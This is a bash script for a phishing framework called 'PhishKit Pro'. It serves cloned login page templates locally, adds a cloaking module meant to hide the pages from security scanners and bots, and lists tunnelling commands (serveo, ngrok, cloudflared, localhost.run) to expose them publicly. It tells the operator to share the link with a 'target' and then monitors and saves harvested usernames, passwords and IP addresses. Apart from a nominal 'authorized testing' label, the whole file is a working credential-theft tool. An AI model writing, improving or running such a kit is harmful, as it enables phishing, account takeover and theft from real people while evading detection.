#!/bin/bash

# PhishKit Pro — Evasion-Enhanced Phishing Framework
# For Authorized Security Testing Only

RED='\033[1;31m'; GREEN='\033[1;32m'; BLUE='\033[1;34m'
YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; NC='\033[0m'

HOST="127.0.0.1"
PORT="8080"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    clear
    echo -e "${RED}"
    echo "  ____  _     _     _    _ _ _   _ "
    echo " |  _ \| |__ (_)___| | _(_) | |_| |"
    echo " | |_) | '_ \| / __| |/ / | | __| |"
    echo " |  __/| | | | \__ \   <| | | |_|_|"
    echo " |_|   |_| |_|_|___/_|\_\_|_|\__(_)"
    echo -e "${NC}"
    echo -e "${CYAN}  PhishKit Pro v3.0 — Anti-Detection Framework${NC}"
    echo -e "${YELLOW}  For Authorized Security Testing Only${NC}"
    echo ""
}

list_templates() {
    echo -e "${BLUE}[+] Available Templates:${NC}\n"
    local i=1
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        [[ "$name" == _* ]] && continue
        echo -e "  ${GREEN}$i)${NC} $name"
        i=$((i+1))
    done
    echo ""
}

setup_site() {
    local site_name="$1"
    local site_dir="$BASE_DIR/.sites/$site_name"
    local www_dir="$BASE_DIR/.server/www"
    
    mkdir -p "$www_dir"
    rm -rf "$www_dir"/*
    
    echo -e "${BLUE}[+] Setting up cloaked phishing page for: ${WHITE}$site_name${NC}"
    
    # ===== FIX: Copy template AND cloaking module correctly =====
    # Copy the template files into a subdirectory matching the site name
    cp -r "$site_dir" "$www_dir/"
    
    # Copy _cloak.php into the site's directory so the relative path works
    # from the PHP server's working directory
    if [[ -f "$BASE_DIR/.sites/_cloak.php" ]]; then
        cp "$BASE_DIR/.sites/_cloak.php" "$www_dir/_cloak.php"
        echo -e "${GREEN}[+] Cloaking module loaded${NC}"
    else
        echo -e "${YELLOW}[!] Warning: _cloak.php not found. Run without cloaking.${NC}"
    fi
    
    # ===== FIX: Update index.php paths to match the actual file layout =====
    # The site files are now at .server/www/site_name/index.php
    # and _cloak.php is at .server/www/_cloak.php
    # So the relative path from index.php to _cloak.php is ../_cloak.php
    
    local site_index="$www_dir/$site_name/index.php"
    if [[ -f "$site_index" ]]; then
        # Replace the include path to use the correct relative path
        # from the copied location
        sed -i 's|__DIR__ . '"'"'/../../../.sites/_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$site_index"
        sed -i 's|__DIR__ . '"'"'/../../.sites/_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$site_index"
    fi
    
    # Start server from the www root so paths resolve correctly
    echo -e "${BLUE}[+] Starting PHP server on ${WHITE}$HOST:$PORT${NC}"
    cd "$www_dir" && php -S "$HOST:$PORT" > /dev/null 2>&1 &
    local pid=$!
    sleep 1
    
    if kill -0 $pid 2>/dev/null; then
        echo -e "${GREEN}[+] Server running at: http://$HOST:$PORT${NC}"
        echo -e "${GREEN}[+] Template URL: http://$HOST:$PORT/$site_name/${NC}"
    else
        echo -e "${RED}[-] Failed to start PHP server. Is PHP installed?${NC}"
        exit 1
    fi
}

tunnel_options() {
    local site_name="$1"
    echo ""
    echo -e "${CYAN}=== Tunnel Options (for external access) ===${NC}"
    echo -e "  ${YELLOW}1)${NC} Serveo (SSH, no install):"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT serveo.net${NC}"
    echo -e "     ${WHITE}Target URL: http://[serveo-subdomain].serveo.net/$site_name/${NC}"
    echo -e "  ${YELLOW}2)${NC} Ngrok:"
    echo -e "     ${WHITE}ngrok http $PORT${NC}"
    echo -e "     ${WHITE}Target URL: https://[ngrok-subdomain].ngrok.io/$site_name/${NC}"
    echo -e "  ${YELLOW}3)${NC} Cloudflared:"
    echo -e "     ${WHITE}cloudflared tunnel --url http://localhost:$PORT${NC}"
    echo -e "     ${WHITE}Target URL: https://[cloudflare-subdomain].trycloudflare.com/$site_name/${NC}"
    echo -e "  ${YELLOW}4)${NC} Localhost.run:"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT nokey@localhost.run${NC}"
    echo ""
}

monitor() {
    local site_name="$1"
    local www_dir="$BASE_DIR/.server/www"
    local auth_dir="$BASE_DIR/auth"
    mkdir -p "$auth_dir"
    
    # The credentials will be written to the site's subdirectory
    local site_data_dir="$www_dir/$site_name"
    
    echo -e "${YELLOW}[*] Monitoring for credentials... (Ctrl+C to stop)${NC}"
    echo -e "${YELLOW}[*] Captured data will be saved to: $auth_dir${NC}\n"
    
    local last_cred_mod=0
    
    while true; do
        # Monitor credentials in the site directory
        local cred_file="$site_data_dir/usernames.txt"
        if [[ -f "$cred_file" ]]; then
            local current_mod=$(stat -c %Y "$cred_file" 2>/dev/null || echo 0)
            if (( current_mod > last_cred_mod )); then
                echo -e "${RED}[!] ${GREEN}************************************${NC}"
                echo -e "${RED}[!] ${GREEN}CREDENTIALS CAPTURED!${NC}"
                echo -e "${RED}[!] ${GREEN}************************************${NC}"
                cat "$cred_file" | while read -r line; do
                    [[ -n "$line" ]] && echo -e "  ${WHITE}$line${NC}"
                done
                # Copy to persistent storage
                cp "$cred_file" "$auth_dir/credentials.txt" 2>/dev/null
                last_cred_mod=$current_mod
                echo ""
            fi
        fi
        
        # Also check for IP log
        local ip_file="$site_data_dir/ip.txt"
        if [[ -f "$ip_file" ]]; then
            cat "$ip_file" >> "$auth_dir/ip_log.txt" 2>/dev/null
        fi
        
        sleep 1
    done
}

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    rm -rf "$BASE_DIR/.server"
    echo -e "${GREEN}[+] Done.${NC}"
    exit 0
}

main() {
    banner
    list_templates
    
    echo -ne "${CYAN}[?] Select template number: ${NC}"
    read choice
    
    local i=1
    local selected=""
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        [[ "$name" == _* ]] && continue
        if [[ $i -eq $choice ]]; then
            selected="$name"
            break
        fi
        i=$((i+1))
    done
    
    if [[ -z "$selected" ]]; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi
    
    trap cleanup EXIT INT TERM
    
    setup_site "$selected"
    tunnel_options "$selected"
    
    echo -e "${GREEN}[+] Share this URL with your target: http://$HOST:$PORT/$selected/${NC}"
    echo -e "${YELLOW}[!] Note: The cloaking layer will block scanners and bots.${NC}"
    echo -e "${YELLOW}[!] Real users will see the login page after JavaScript verification.${NC}"
    echo ""
    echo -ne "${CYAN}[?] Press Enter to start monitoring...${NC}"
    read
    
    monitor "$selected"
}

main